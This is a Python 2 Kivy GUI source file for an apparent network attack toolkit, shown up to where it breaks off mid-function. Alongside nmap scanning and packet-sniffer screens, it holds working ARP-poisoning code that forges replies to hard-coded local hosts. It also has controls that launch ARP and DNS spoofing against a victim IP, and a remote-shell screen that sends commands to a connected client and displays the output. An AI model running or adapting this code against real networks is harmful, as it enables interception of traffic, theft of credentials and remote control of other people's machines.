#!/usr/bin/python
from kivy.uix.dropdown import DropDown
from kivy.core.window import Window
from kivy.graphics import *
from kivy.uix.textinput import TextInput
from kivy.app import App
from kivy.uix.floatlayout import *
from kivy.uix.boxlayout import *
from kivy.uix.dropdown import DropDown
from kivy.uix.button import Button
from kivy.core.text import *
from kivy.core.text.markup import *
from kivy.properties import *
from kivy.uix.label import Label
from kivy.uix.popup import Popup
from kivy.uix.colorpicker import *
from kivy.uix.tabbedpanel import TabbedPanel
from kivy.properties import ObjectProperty as op, NumericProperty, StringProperty
from kivy.animation import Animation

from kivy.uix.scrollview import ScrollView
from kivy.uix.gridlayout import GridLayout
from kivy.uix.rst import RstDocument
import nmap
import sys
from scanner.scanner import *
# from sniffer.sniffer import *
# from sniffer.passwordsniffer import *
from kivy.uix.screenmanager import ScreenManager, Screen, SlideTransition
from kivy.uix.modalview import ModalView
import pcapy

import socket 
import threading
from kivy.clock import Clock

import time
import os


from MitM.dns import *
from MitM.arp_spoofing import *
from sniffer.passwordsniffer import *

clients={}

#Window.size=(1350, 800)
#Window.clearcolor=(1,1,1,3)
#scan_results= op()
#Window.fullscreen='auto'

s=DropDown()


import sys
from scapy.all import sniff, sendp, ARP, Ether

router_ip=0



#scan_types=['Syn Scan', 'X-mas Scan', 'NUll Scan', 'Idle Scan']

def arp_poison_callback(packet):
    b=BoxLayout()
    global router_ip
    # Got ARP request?
    answer = Ether(dst=packet[ARP].hwsrc) / ARP()
    #print (packet[ARP].pdst + "\n"+ "src is " + packet[ARP].psrc + "\n")
    
    if packet[ARP].op == 1 and str(packet[ARP].psrc)==str('192.168.100.5') and str(packet[ARP].pdst)=='192.168.100.1':
        
        answer = Ether(dst=packet[ARP].hwsrc) / ARP()
        answer[ARP].op = "is-at"
        answer[ARP].hwdst = packet[ARP].hwsrc
        answer[ARP].psrc = packet[ARP].pdst
        answer[ARP].pdst = packet[ARP].psrc
        router_ip=packet[ARP].pdst
        txt1="Fooling " + packet[ARP].psrc + " that " + packet[ARP].pdst + " is me"
        print txt1
        b.add_widget(Label(text=txt1, pos_hint= {'x': .1,'top': .2},size_hint = (.1,.1)))
        sendp(answer, iface='wlan0')
        
    if packet[ARP].op == 1 and (router_ip):
        if(str(packet[ARP].psrc) ==router_ip and str(packet[ARP].pdst)==str('192.168.100.5')):          
            device_b = Ether(dst=packet[ARP].hwsrc) / ARP()
            device_b[ARP].op = "is-at"
            device_b[ARP].hwdst = packet[ARP].hwsrc
            device_b[ARP].psrc = packet[ARP].pdst
            device_b[ARP].pdst = packet[ARP].psrc
            txt2="Now Fooling " + packet[ARP].psrc + " that " + packet[ARP].pdst + " is me"
            print txt2
            b.add_widget(Label(text=txt2, pos_hint= {'x': .1,'top': .2},size_hint = (.1,.1)))
           
            sendp(device_b, iface='wlan0')  
    
#end of arp spoofing
class SnifferScreen(Screen):
    def __init__(self, *args, **kwargs):
        self.name='Sniffer'
        super(Screen, self).__init__()
        devices = pcapy.findalldevs()
        self.start_sniffer_object=''#variable to holder the thread that sniffs
        # self.dropdown = DropDown()

        # drp=self.ids.dropdown2
        # for d in devices:
        #     btn=Button(text=d, id='btn_int', size_hint_y=None, height=30, on_release=lambda x:drp.select(d) )
        #     self.ids.dropdown2.add_widget(btn)

    #def start_sniffer(self, sniff_type):
        #self.ids.ip_to_sniff_space.clear_widgets()
        #print "============"+sniff_type
        
        # if sniff_type.strip().lower()=='specific ip':
        #     ob=self.ids.ip_to_sniff_space.add_widget(TextInput(hint_text="Enter Target ip",id='ip_to_sniff', size_hint=(None, None), width=140,height=30, pos_hint={'top':.8}))
            #children = self.children[:]

            
            # for i, c in enumerate(self.children):
            #     print str(i) + str(self.children[i])
                



            # while children:
            #     child = children.pop()
            #     if child.id:
            #         print child.id.text
            #     children.extend(child.children)
        #     self.ip_to_sniff='10.0.0.1'
        # else:
        #     self.ip_to_sniff=''
    def warning(self, *args):
        w=str(args[0])
        content = Label(text = w)
        print "warning fired"
        self._popup = Popup(title="Warning !",content=content,size_hint=(0.9,0.9))
        self._popup.open()
    def sniff_traffic(self, interface_choice):
        #self.ids.sniffing_status.text='Sniffing network traffic !'
        self.ip_list=[]
        self.packets_captured=[]#store the captured packets
        ip_to_sniff=''
        self.sniffer_object=sniffer()
        self.start_sniffer_object=threading.Thread(target=self.sniffer_object.start_sniffing, args=(interface_choice,ip_to_sniff ) ).start()
        if self.sniffer_object.error != False:
            warning=MenuScreen()
            warning.warning('error!')
            self.warning(self.sniffer_object.error)
            print 'following error occured ' +  str(self.sniffer_object.error)
            return 0
        self.event=Clock.schedule_interval(self.display_sniff_results, 5/1)   
           
    def display_sniff_results(self, *args):

        if self.sniffer_object.matched_packet !='' and self.sniffer_object.source_ip !='' and self.sniffer_object.stop=='':
            ips=str(self.sniffer_object.destination_ip) + str(self.sniffer_object.source_ip)
            if ips in self.ip_list:
                if(self.sniffer_object.matched_packet in self.packets_captured):
                    return 0
            if int(len(self.sniffer_object.matched_packet)) > 300:
                filename=str(time.asctime()) +'.txt'
                fh=open(filename, 'w')
                fh.write(self.sniffer_object.matched_packet)
                if fh:
                    dir_path = os.path.dirname(os.path.realpath(filename))
                    self.sniffer_object.matched_packet="packet too large to display. packet stored in " + dir_path + '/'+filename
                    
                    fh.close()
                
            self.ip_list.append(ips)
            self.ids.sniffer_results.add_widget(Label(text=str(self.sniffer_object.source_ip),color=(0,0,0,1),size_hint_y=None ,height=100, pos_hint={'top':1}))
            self.ids.sniffer_results.add_widget(Label(text=str(self.sniffer_object.destination_ip),color=(0,0,0,1),size_hint_y=None ,height=100, pos_hint={'top':1}))
            # self.ids.sniffer_results.add_widget(Label(text=str('tcp'),color=(0,0,0,1),size_hint_y=None ,height=40, pos_hint={'top':1}))
            #self.ids.sniffer_results.add_widget(Label(text=str(time.ctime()),color=(0,0,0,1),size_hint_y=None ,height=40, pos_hint={'top':1}))
            self.ids.sniffer_results.add_widget(Label(text=str(self.sniffer_object.matched_packet),color=(0,0,0,1),size_hint_y=None ,height=100, pos_hint={'top':1}, 
                text_size=(265, None), haligh='left', valign='bottom'))
            self.packets_captured.append(self.sniffer_object.matched_packet.strip())
            print "packet len is -----> " + str(len(self.sniffer_object.matched_packet))
    def stop_sniffer(self):
        if self.start_sniffer_object=='':
            return 0
        else:
            self.sniffer_object.stop=True
            #self.ids.sniffing_status.text='sniffer stopped'
            self.event.cancel()


class MenuScreen(Screen):
    angle=NumericProperty(0)
    def __init__(self, **kwargs):
        stop=threading.Event()
        super(MenuScreen, self).__init__(**kwargs)
        self.anim=Animation(angle=360, duration=5)
        self.ids.spin.opacity=0
        self.all_hosts=[]
        self.all_host_info={}
        self.all_services=[]
        self.all_state=[]
        self.all_reason=[]
        self.ping_scan=False

    def scan(self, scan_type_choice, target_host):
        self.ids.spin.opacity=1
        threading.Thread(target=self.start_scanner, args=(scan_type_choice, target_host, ) ).start()
        self.anim=Animation(angle=360, duration=5)
        self.anim+=Animation(angle=360, duration=5)
        self.anim.repeat=True
        self.anim.start(self)  
    def get_hosts(self):
        #self.ids.sr2.clear_widgets()
  
            
        self.ids.side_bar.clear_widgets()
        self.ids.sr.cols=4
        #return nothing if only one host
        if len(self.all_hosts)==1:
            return 0
        #print 'DDD-=>>>>'+str(self.all_hosts)

        for i, host in enumerate(self.all_hosts):
            if i % 2 ==0:
                #print '======0> ' + str (self.all_hosts[i])
                
                b=Button(text=str(host),on_release=lambda x, i=i:self.display_hosts(self.all_hosts[i+1]), text_size=(180, None),halign='left', color=(0,0,0,1),size_hint_y=None ,height=40, pos_hint={'top':1}, background_color=(242,242,242,1))

                self.ids.side_bar.add_widget(b)

    def display_hosts(self, host_info):
        print 'f'
        self.ids.sr.cols=3
        
        self.ids.sr.clear_widgets()
        self.ids.sr2.clear_widgets()
        print '/////'+str(host_info)
        if self.ping_scan==True:
            self.ids.sr.cols=5
            self.ids.sr.add_widget(Label(text='HOST IP',color=(0,0,0,1),size_hint_y=None ,height=40, pos_hint={'top':1} ))
            # self.ids.sr.add_widget(Label(text='MAC ADDRESS',color=(0,0,0,1), size_hint_y=None, height=40, pos_hint={'top':1}))
            self.ids.sr.add_widget(Label(text='Vendor',color=(0,0,0,1), size_hint_y=None,pos_hint={'top':1}, height=40))
            self.ids.sr.add_widget(Label(text='HOST NAME',color=(0,0,0,1),size_hint_y=None ,height=40, pos_hint={'top':1} ))
            self.ids.sr.add_widget(Label(text='STATE',color=(0,0,0,1), size_hint_y=None, height=40, pos_hint={'top':1}))
            self.ids.sr.add_widget(Label(text='REASON',color=(0,0,0,1), size_hint_y=None,pos_hint={'top':1}, height=40))
      
            self.ids.sr.add_widget(Label(text=str(host_info['ip']),color=(0,0,0,1),size_hint_y=None ,height=40, pos_hint={'top':1} ))
            # self.ids.sr.add_widget(Label(text=str('None'),color=(0,0,0,1),size_hint_y=None ,height=40, pos_hint={'top':1} ))
            self.ids.sr.add_widget(Label(text=str(host_info['vendor']),color=(0,0,0,1),size_hint_y=None ,height=40, pos_hint={'top':1} ))
            self.ids.sr.add_widget(Label(text=str(host_info['hostname']),color=(0,0,0,1),size_hint_y=None ,height=40, pos_hint={'top':1} ))
            self.ids.sr.add_widget(Label(text=str(host_info['state']),color=(0,0,0,1),size_hint_y=None ,height=40, pos_hint={'top':1} ))
            self.ids.sr.add_widget(Label(text=str(host_info['reason']),color=(0,0,0,1),size_hint_y=None ,height=40, pos_hint={'top':1} ))
        else:
            self.ids.sr.add_widget(Label(text='PORT',color=(0,0,0,1),size_hint_y=None ,height=40, pos_hint={'top':1} ))
            self.ids.sr.add_widget(Label(text='SERVICE',color=(0,0,0,1), size_hint_y=None, height=40, pos_hint={'top':1}))
            self.ids.sr.add_widget(Label(text='STATE',color=(0,0,0,1), size_hint_y=None,pos_hint={'top':1}, height=40))
            #self.ids.sr.add_widget(Label(text='',color=(0,0,0,1),size_hint_y=None ,height=40, pos_hint={'top':1} ))

            for i, info in enumerate(host_info):
                if info:
                    #for h in host_info:
                    self.ids.sr.add_widget(Label(text=str(host_info[i]['port']),color=(0,0,0,1),size_hint_y=None ,height=40, pos_hint={'top':1} ))
                    self.ids.sr.add_widget(Label(text=str(host_info[i]['service_name']),color=(0,0,0,1),size_hint_y=None ,height=40, pos_hint={'top':1} ))
                    self.ids.sr.add_widget(Label(text=str(host_info[i]['state']),color=(0,0,0,1),size_hint_y=None ,height=40, pos_hint={'top':1} ))     
                    #self.ids.sr.add_widget(Label(text=str(host_info[i]['state']),color=(0,0,0,1),size_hint_y=None ,height=40, pos_hint={'top':1} ))
                    #self.ids.sr.add_widget(Label(text='reason ',color=(0,0,0,1),size_hint_y=None ,height=40, pos_hint={'top':1} ))
                        
    def get_services(self):
        self.ids.sr.clear_widgets()
        self.ids.side_bar.clear_widgets()
        self.ids.sr.cols=1
        self.service_list=[]
        for i,service in enumerate(self.all_services):
            if service not in self.service_list:
                self.service_list.append(service)
                lb=Button(on_release=lambda x, i=i:self.display_services(i),text=str( service['service_name']),text_size=(180, None),halign='left', color=(0,0,0,1),size_hint_y=None ,height=40, pos_hint={'top':1}, background_color=(242,242,242,1) )
                self.ids.side_bar.add_widget(lb)
        self.all_services=self.service_list
    def display_services(self, service_index):
        self.ids.sr.clear_widgets()
        print 'works ' + str(self.all_services[service_index])
        self.ids.sr.cols=4
        self.ids.sr.add_widget(Label(text='PORT',color=(0,0,0,1),size_hint_y=None ,height=40, pos_hint={'top':1} ))
        self.ids.sr.add_widget(Label(text='SERVICE',color=(0,0,0,1), size_hint_y=None, height=40, pos_hint={'top':1}))
        self.ids.sr.add_widget(Label(text='STATE',color=(0,0,0,1), size_hint_y=None,pos_hint={'top':1}, height=40))
        self.ids.sr.add_widget(Label(text='HOST',color=(0,0,0,1), size_hint_y=None,pos_hint={'top':1}, height=40))


        self.ids.sr.add_widget(Label(text=str(self.all_services[service_index]['port']),size_hint_y=None, color=(0,0,0,1), height=30, pos_hint={'top':1}))
        self.ids.sr.add_widget(Label(text=str(self.all_services[service_index]['service_name']),size_hint_y=None, color=(0,0,0,1), height=30, pos_hint={'top':1}))
        self.ids.sr.add_widget(Label(text=str(self.all_services[service_index]['state']),size_hint_y=None,color=(0,0,0,1), pos_hint={'top':1}, height=30)) 
        self.ids.sr.add_widget(Label(text=str(self.all_services[service_index]['host']),size_hint_y=None,color=(0,0,0,1), pos_hint={'top':1}, height=30))

    def on_angle(self, item, angle):
        if angle==360:
            item.angle=0
    def stop_loading(self):
        self.stop_l=True

    def warning(self, *args):
        self.ids.spin.opacity=0
        w=str(args[0])
        content = Label(text = w)
        self._popup = Popup(title="Warning !",content=content,size_hint=(0.9,0.9))
        self._popup.open()
    def check_ip(self, ip):
        if  '.' not in ip and str(ip.lower().strip()) != 'localhost':
            return False        
        try:
            if str(ip.lower().strip())=='localhost':
                return True
            
            if '/' in ip:
                new_ip=ip.split('/')
                ip=new_ip[0]
                if len(new_ip[0].split('.')) !=4:
                    return False 

            splited_ip=ip.split('.')
            for i in splited_ip:
                try:
                    n=int(i)
                except:
                    return True
            if len(splited_ip) != 4:
                return False

            for i in splited_ip:
                if int(i)>255:
                    return False
                if int(i)<0:
                    return False
            return True
        except:
            return False

    def start_scanner(self, scan_type_choice, target_host):
        try:
            #initialize to zero 
            self.all_host_info={}
            self.all_services=[]
            self.all_state=[]
            self.all_reason =[]
            self.all_hosts=[]
            self.ids.side_bar.clear_widgets()
            scan_arguments=''
            if target_host=='' and self.ids.scan_command.text=='':
                w='Please enter the target Host'
                self.warning(w)
                print w
            else:
                correct_ip=True
                if self.ids.scan_command.text=='':
                    correct_ip=self.check_ip(target_host)

                if not (correct_ip):
                    w='Please enter a valid ip target'
                    self.warning(w)
                    print w
                else:
                    scanner_object=NmapScanner()
                    if self.ids.scan_command.text=='':
                        if scan_type_choice =='Syn Scan':
                            scan_type_choice ='-sS'
                        scan_return=scanner_object.nmapScan(str(target_host), str(scan_type_choice))
                        if scan_return:
                          self.warning(scan_return)
                          return 0
                    else:   
                        scan_return=scanner_object.nmapScan(self.ids.scan_command.text)   
                        target_host=self.ids.scan_command.text   
                        scan_arguments=target_host.split(' ') 
                        if int(len(scan_arguments))==2:
                            scan_arguments=scan_arguments[1]            
                        print 'nnnnnnnnnnnnnnnn' 
                        if scan_return:
                          self.warning(scan_return)
                          return 0               
                    self.ids.sr2.clear_widgets()
                    self.ids.sr.clear_widgets()
                    if scanner_object.nmScan.all_hosts():
                        lport=''


                        if '/' not in target_host and '-' not in target_host and '-sn' != scan_type_choice and '-sn' not in scan_arguments:                      

                            #print scan_type_choice; exit(0)
                            self.results="my custom results" 
                            self.all_hosts=[]
                            self.all_hosts.append(target_host)

                            if scanner_object.protocols:
                              try:

                                for pr, proto in enumerate(scanner_object.protocols):
                                    lport = scanner_object.nmScan[scanner_object.tgtHost][proto].keys()
                                    protocol_length=len(lport)
                                    lport.sort()    
                                    
                                    for po, port in enumerate(lport):
                                        self.service_dict={}
                                        if scanner_object.version_detection:
                                            scanner_object.s_version.append(str(scanner_object.nmScan[scanner_object.tgtHost][proto][port]['product']) + str(scanner_object.nmScan[scanner_object.tgtHost][proto][port]['version'] +  " "  + 
                                            "("+str(scanner_object.nmScan[scanner_object.tgtHost][proto][port]['extrainfo']) + ")"))
                                        self.service_dict['service_name']=scanner_object.nmScan[scanner_object.tgtHost][proto][port]['name'].strip()
                                        self.service_dict['state']=scanner_object.nmScan[scanner_object.tgtHost][proto][port]['state'].strip()
                                        self.service_dict['reason']= scanner_object.nmScan[scanner_object.tgtHost][proto][port]['reason'].strip()
                                        self.service_dict['port']=port
                                        self.service_dict['host']=target_host
                                        self.all_services.append(self.service_dict)#append the information of every service in a list
                                        scanner_object.service.append(scanner_object.nmScan[scanner_object.tgtHost][proto][port]['name'].strip())
                                        scanner_object.state.append(scanner_object.nmScan[scanner_object.tgtHost][proto][port]['state'])
                                        """self.ids.sr.add_widget(Label(text=str(scanner_object.service[po]) + "\ "+proto + "  \t "+str(scanner_object.state[po]) ,size_hint_x=None,width=200,size_hint_y=None, height=60, halign='left', pos_hint={'top':1}, color=(0,0,0,1))) """
                                        scanner_object.reason.append(scanner_object.nmScan[scanner_object.tgtHost][proto][port]['reason'].strip())
                              except:
                                print"fffff"
                            
                            self.ids.sr.add_widget(Label(text='PORT',color=(0,0,0,1),size_hint_y=None ,height=40, pos_hint={'top':1} ))
                            self.ids.sr.add_widget(Label(text='SERVICE',color=(0,0,0,1), size_hint_y=None, height=40, pos_hint={'top':1}))
                            self.ids.sr.add_widget(Label(text='STATE',color=(0,0,0,1), size_hint_y=None,pos_hint={'top':1}, height=40))
                            self.ids.sr.add_widget(Label(text='REASON',color=(0,0,0,1), size_hint_y=None,pos_hint={'top':1}, height=40))
                            
                            if 'v' in scan_type_choice or 'V' in scan_type_choice or scanner_object.version_detection==True:
                                self.ids.sr.cols=5
                                self.ids.sr.add_widget(Label(text='VERSION', color=(0,0,0,1), size_hint_y=None, height=45, pos_hint={'top':1}))
                            else:
                                self.ids.sr.cols=4      
                            for i, pr in enumerate(lport) :

                                self.ids.sr.add_widget(Label(text=str(lport[i]),size_hint_y=None, color=(0,0,0,1), height=30, pos_hint={'top':1}))
                                self.ids.sr.add_widget(Label(text=scanner_object.service[i],size_hint_y=None, color=(0,0,0,1), height=30, pos_hint={'top':1}))
                                self.ids.sr.add_widget(Label(text=scanner_object.state[i],size_hint_y=None,color=(0,0,0,1), pos_hint={'top':1}, height=30)) 
                                self.ids.sr.add_widget(Label(text=scanner_object.reason[i],size_hint_y=None,color=(0,0,0,1), pos_hint={'top':1}, height=30))
                       
                                if self.ids.sr.cols==5:
                                    self.ids.sr.add_widget(Label(text=scanner_object.s_version[i], size_hint_y=None, color=(0,0,0,1), height=30, pos_hint={'top':1}))
                            if scanner_object.os_detection:
                                self.ids.sr.add_widget(Label(text='',size_hint_y=None, color=(0,0,0,1), height=30, pos_hint={'top':1}))
                                self.ids.sr.add_widget(Label(text='',size_hint_y=None, color=(0,0,0,1), height=30, pos_hint={'top':1}))
                                self.ids.sr.add_widget(Label(text='',size_hint_y=None,color=(0,0,0,1), pos_hint={'top':1}, height=30)) 
                                self.ids.sr.add_widget(Label(text='',size_hint_y=None,color=(0,0,0,1), pos_hint={'top':1}, height=30))

                                self.ids.sr.add_widget(Label(text=''))
                                self.ids.sr.add_widget(Label(text=scanner_object.os + scanner_object.cpe,text_size=(600, None),halign='left', size_hint_y=None,color=(0,0,0,1), pos_hint={'top':1}, height=30))    
                                self.ids.sr.add_widget(Label(text=''))
                                self.ids.sr.add_widget(Label(text=''))
                                self.ids.sr.add_widget(Label(text=''))
                                self.ids.sr.add_widget(Label(text=scanner_object.cpe,size_hint_y=None,color=(0,0,0,1),text_size=(600, None),halign='left', pos_hint={'top':1}, height=30))
                                self.ids.sr.add_widget(Label(text=''))
                                self.ids.sr.add_widget(Label(text=''))
                                self.ids.sr.add_widget(Label(text=''))
                                self.ids.sr.add_widget(Label(text=scanner_object.device_type,size_hint_y=None,color=(0,0,0,1),text_size=(600, None),halign='left', pos_hint={'top':1}, height=30))
                                self.ids.sr.add_widget(Label(text=''))
                                self.ids.sr.add_widget(Label(text=''))
                                self.ids.sr.add_widget(Label(text=''))
                                self.ids.sr.add_widget(Label(text=scanner_object.accuracy,size_hint_y=None,color=(0,0,0,1), text_size=(600, None),halign='left', pos_hint={'top':1}, height=30))
                                self.ids.sr.add_widget(Label(text=''))
                                self.ids.sr.add_widget(Label(text=''))
                                
                        else:
                            #sprint 'many hosts'
                            self.ping_scan=False
                            self.ids.sr2.clear_widgets()
                            self.all_services=[]
                            
                            self.ids.sr2.height=600*int(len(scanner_object.nmScan.all_hosts()))
                            file_scans=open('scans.txt', 'w')
                            #check to see if it is a ping scan that does not need port scanning    
                            
                            if  '-sn' in scan_arguments or scan_type_choice=='-sn':
                                self.ping_scan=True                        
                                try:
                                    self.host_info_ping=[]
                                    if int(scanner_object.nmScan.scanstats()['uphosts'])>1:
                                        
                                        nm=scanner_object.nmScan
                                        for host in nm.all_hosts():
                                            print host 
                                            self.all_hosts.append(host)
                                            ping_scan_results={}
                                            ping_scan_results['state']=nm[host]['status']['state']
                                            ping_scan_results['reason']=nm[host]['status']['reason']
                                            #try:
                                            #self.ping_scan_results['mac']=nm[host]['addresses']['mac']
                                            #except Exception, e:
                                            #self.ping_scan_results['mac']=''

                                            ping_scan_results['ip']=nm[host]['addresses']['ipv4']
                                            ping_scan_results['vendor']=nm[host]['vendor']
                                            ping_scan_results['hostname']=nm[host]['hostnames'][0]['name']
                                            #self.host_info_ping.append(ping_scan_results)
                                            self.all_hosts.append(ping_scan_results)
                                        # print self.all_hosts
                                        
                                        self.get_hosts()
                                    else:
                                        nm=scanner_object.nmScan
                                        host=scanner_object.nmScan.all_hosts()[0]

                                        self.ids.sr.clear_widgets()
                                        self.ids.sr.cols=5
                                        self.ids.sr.add_widget(Label(text='HOST IP',color=(0,0,0,1),size_hint_y=None ,height=40, pos_hint={'top':1} ))
                                        #self.ids.sr.add_widget(Label(text='MAC ADDRESS',color=(0,0,0,1), size_hint_y=None, height=40, pos_hint={'top':1}))
                                        self.ids.sr.add_widget(Label(text='Vendor',color=(0,0,0,1), size_hint_y=None,pos_hint={'top':1}, height=40))
                                        self.ids.sr.add_widget(Label(text='HOST NAME',color=(0,0,0,1),size_hint_y=None ,height=40, pos_hint={'top':1} ))
                                        self.ids.sr.add_widget(Label(text='STATE',color=(0,0,0,1), size_hint_y=None, height=40, pos_hint={'top':1}))
                                        self.ids.sr.add_widget(Label(text='REASON',color=(0,0,0,1), size_hint_y=None,pos_hint={'top':1}, height=40))
                                  
                                        self.ids.sr.add_widget(Label(text=str(nm[host]['addresses']['ipv4']),color=(0,0,0,1),size_hint_y=None ,height=40, pos_hint={'top':1} ))
                                        #self.ids.sr.add_widget(Label(text=str('None'),color=(0,0,0,1),size_hint_y=None ,height=40, pos_hint={'top':1} ))
                                        self.ids.sr.add_widget(Label(text=str(nm[host]['vendor']),color=(0,0,0,1),size_hint_y=None ,height=40, pos_hint={'top':1} ))
                                        self.ids.sr.add_widget(Label(text=str(nm[host]['hostnames'][0]['name']),color=(0,0,0,1),size_hint_y=None ,height=40, pos_hint={'top':1} ))
                                        self.ids.sr.add_widget(Label(text=str(nm[host]['status']['state']),color=(0,0,0,1),size_hint_y=None ,height=40, pos_hint={'top':1} ))
                                        self.ids.sr.add_widget(Label(text=str(nm[host]['status']['reason']),color=(0,0,0,1),size_hint_y=None ,height=40, pos_hint={'top':1} ))                                        
                                except Exception, e:
                                    self.warning(e)
                                    print e
                                self.ids.spin.opacity=0.0
                                return 0
                            for host in scanner_object.nmScan.all_hosts():
                                self.all_hosts.append(host)
                                self.ids.sr2.cols=1
                                #file_scans.write(host + " is up" )
                                h=BoxLayout()
                                h.add_widget(Label(text=host + " is up ", size_hint_y=None, height=30, color=(0,0,0,1), size_hint_x=1))
                                
                                self.ids.sr2.add_widget(h)
                                
                                # box_col=BoxLayout(orientation='horizontal', size_hint_x=1)                  
                                # box_col.add_widget(Button(text='PORT.',  size_hint_y=None, height=30, background_color=(0,0,0,0.24), color=(0,0,0,1)))
                                # box_col.add_widget(Button(text='SERVICE', background_color=(0,0,0,0.24), color=(0,0,0,1), size_hint_y=None, height=30,))
                                # box_col.add_widget(Button(text='STATE', background_color=(0,0,0,0.24), color=(0,0,0,1), size_hint_y=None, height=30,))
                                
                                #self.ids.sr2.add_widget(box_col)
                                
                                self.host_info=[]

                            for i, protocol in enumerate(scanner_object.nmScan[host].all_protocols()):
                                    list_of_ports=scanner_object.nmScan[host][protocol].keys()
                                    for port in list_of_ports:
                                        self.port_info={}
                                        service=str(scanner_object.nmScan[host][protocol][port]['name'].strip())
                                        state=str(scanner_object.nmScan[host][protocol][port]['state'].strip())
                                        self.port_info['service_name']=service
                                        self.port_info['state']=state
                                        self.port_info['port']=port
                                        self.port_info['host']=host

                                        self.host_info.append(self.port_info)
                                        self.all_services.append(self.port_info)
                            self.all_hosts.append(self.host_info) 
                            self.get_hosts()
                    
                        self.ids.spin.opacity=0.0
                    # self.g.add_widget(Button(text='PRINT',  size_hint_y=None, height=30,))                                
                    else:
                        self.warning('The Target Host entered is unreachable')
                        print   'The Target Host entered is unreachable'
                        self.ids.spin.opacity=0.0
        
        except Exception, e:
            self.warning('ERROR !! '+str(e))   
            print e     
class SettingsScreen(Screen):
    pass


class MitmScreen(Screen):
    def __init__(self, **kwargs):
      super(MitmScreen, self).__init__(**kwargs)
      self.dns=0#avoid similar multiple widgets when button is clicked
      tst=ObjectProperty(None)
      self.start_dnsspoof_thread=''
      self.spoofer_object=Dns_spoofing()
    def view_arp_spoofer(self):
          self.ids.arp_victim_ip.height=36
          #self.ids.arp_spoofed_ip.height=30
          self.ids.arp_fields.opacity=1  
          # self.ids.faked_ip.height=0
          # self.ids.address_to_spoof.height=0
          self.ids.victim_ip.height=0
          self.ids.faked_ip.height=0
          self.ids.interface_choice_arp.height=36
          self.ids.dns_spoof_button.height=0
          self.ids.address_to_spoof.height=0
          self.ids.dns_fields.opacity=0

    def view_dns_spoofer (self):
      if self.dns==0:
          # box=BoxLayout(pos_hint={'top':1}, size_hint_y=None)
          # box.add_widget(TextInput(pos_hint={'top':.8}, size_hint_y=None, height=30, hint_text='Victim Ip', id='victim_ip'))
          # box.add_widget(TextInput(pos_hint={'top':.8}, size_hint_y=None, height=30, hint_text='Target address eg. facebook.com ', id='address'))
          # box.add_widget(TextInput(pos_hint={'top':.8}, size_hint_y=None, height=30, hint_text='fake ip/spoofed ip'))
          # box.add_widget(Button(text='Launch', pos_hint={'top':.8}, size_hint_y=None, height=30, background_color=(.2, .2, .2), on_release=self.handle_dns_spoofing))
          # self.ids.mitm.add_widget(box)
          # self.ids.mitm.add_widget(Button(text='test', id='test',pos_hint={'top':.8}, size_hint_y=None, height=30))
          # self.dns=1 
          #clear arp fields

          self.ids.dropdown_arp.height=0
          self.ids.interface_choice_arp.height=0
          self.ids.arp_victim_ip.height=0
          #self.ids.arp_spoofed_ip.height=0
          self.ids.arp_fields.opacity=0 

          #now add dns fields

          self.ids.victim_ip.height=30
          self.ids.faked_ip.height=30
          self.ids.address_to_spoof.height=30
          self.ids.dns_fields.opacity=1

            
    def handle_dns_spoofing(self):
        #get input text and store into variables
        self.victim_ip=self.ids.victim_ip.text
        self.fake_ip=self.ids.faked_ip.text
        self.address_to_spoof=self.ids.address_to_spoof.text
        # self.ids.dns_fields.height=40
        # self.ids.arp_fields.height=0

        if self.fake_ip=='' :
            warning=MenuScreen()
            warning.warning('Fake/spoofed ip field is mandatory')
            self.ids.attack_status.opacity=0
            return 0
        else:
            # self.ids.dns_spoofing_status.text='Dns Spoofing in progress !'
            self.start_dnsspoof_thread=threading.Thread(target=self.spoofer_object.start, args=(self.victim_ip,self.address_to_spoof, self.fake_ip,))
            self.start_dnsspoof_thread.start()
            self.spoofer_object.stop=''
    def handle_arp_spoofing(self, *args):
        self.arp_spoofing_object=ARP_spoofing()
        self.arp_victim_ip=args[0]
        self.arp_interface=args[1]
        print "victim is "+ str(self.arp_victim_ip)
        print "interface name is "+str(self.arp_interface)
        if self.arp_interface==''  or "Choose Interface" in self.arp_interface:
            warning=MenuScreen()
            warning.warning('Please choose interface')
            print "an error occurred "
            self.ids.arp_attack_status.opacity=0
        else:
            # self.ids.dns_spoofing_status.text='ARP Spoofing in progress...'
            self.ids.arp_attack_status.opacity=1
            self.arp_spoofing_thread=threading.Thread(target=self.arp_spoofing_object.start_arp_spoofing, args=(self.arp_victim_ip, self.arp_interface, ))
            self.arp_spoofing_thread.start()
        
    def stop_arp_spoofing():
        if self.arp_spoofing_thread=='':
            return 0
        else:
            self.arp_spoofing_object.stop=True
            if self. arp_spoofing_object.stop==True:
                self.ids.dns_spoofing_status.text='Spoofing stopped'
    def stop_dns_spoofing(self):
        if self.start_dnsspoof_thread =='':
            return 0
        else:
            self.spoofer_object.stop=True
            if self.spoofer_object.stop==True:
                self.ids.dns_spoofing_status.text='spoofing stoped'


class DosScreen(Screen):
    pass
class RseScreen(Screen):
  def __init__(self, **kwargs):
      super(RseScreen, self).__init__(**kwargs)
      self.listener=''#used to instatiate server in Rse
      self.client={}
      self.stop_rse_server=False
  def warning(self, *args):
    w=str(args[0])
    content = Label(text = w)
    self._popup = Popup(title="Warning !",content=content,size_hint=(0.9,0.9))
    self._popup.open()

  def stop_server(self):
    if self.listener !='':
      self.listener.close()
      self.stop_rse_server=True

      self.ids.serve.text='Server stopped'
    else:
        print 'failed to closed'

  def test(self):
    cmd=self.ids.commands.text
    cmd=cmd.split('>>#')
    cmd=cmd[-1]
    print cmd
    self.ids.commands.text=self.ids.commands.text+'\nthis are \n the results\n hey results\n'+'>>#'
    #self.ids.commands.text=self.ids.commands.text+'\n'+'>>#'

  def client_serve(self):
    try:
      if self.client=={}:
        return 0
      cmd=self.ids.commands.text
      f=open('rse.txt', 'w+')
      if cmd=='' or cmd==None:
        return 0
      cmd=cmd.split('>>#')
      self.ids.commands.text=''
      cmd=cmd[-1]
      cmd+=u"\n"
      client= self.client
      #input=sys.stdin.read()
      
      print 'new command is '+str(cmd)
      client.send(cmd.encode('utf-8'))
      # while True:
      received_data=client.recv(4096)
      # received_data=received_data.decode('utf-8')
      #self.ids.commands.text='>># '+str(cmd)
      # d=[]
      # received_data=received_data.splitlines()
      # if received_data:
      #   for i in received_data:
      #       d.append(i)
      #   received_data=set(d)
      #   self.ids.commands.text=''
      #   for i in received_data:
      
      f.write(received_data)
      f.flush()
      f.close()
      f2=open('rse.txt', 'r')
      self.ids.rse_output.text=''
      for i in f2.readlines():
        self.ids.rse_output.text+=str(i)


      
      
      f2.flush()
      f2.close()
      #print str(received_data)

      
      #   print received_data
      # else:
